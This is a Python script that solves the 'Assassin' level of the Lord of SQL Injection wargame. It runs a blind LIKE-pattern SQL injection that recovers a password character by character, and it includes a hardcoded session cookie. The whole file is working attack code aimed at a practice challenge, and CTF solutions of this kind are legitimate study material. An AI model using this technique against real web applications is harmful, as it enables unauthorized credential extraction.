from requests import get
import string

print("#### Lord of SQL Injection - Assassin ####\n")

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"

cookies = dict(PHPSESSID="5aho86v18hbq6v60moq18la7o8s")

abc = string.digits + string.ascii_letters

result = ""

print("\n\n#### Starting Blind SQL Injection ####\n")
identify = 0
for i in range(1,20):
    for a in abc:
        param = "?pw=" + result + a + "%%%"
        new_url = url + param
        r = get(new_url, cookies=cookies)
        print("Testing char" + a)
        if r.text.find("admin") > 0:
            identify = 1
            print(str(i) + "Find char'" + a )
            result += a
            if r.text.find("<h2>ASSASSIN Clear!</h2>") > 0:
                print("clear")

        
    if len(result) < (i-1):
        break

print("\n\n#### RESULT ####")
print("pw : " + result)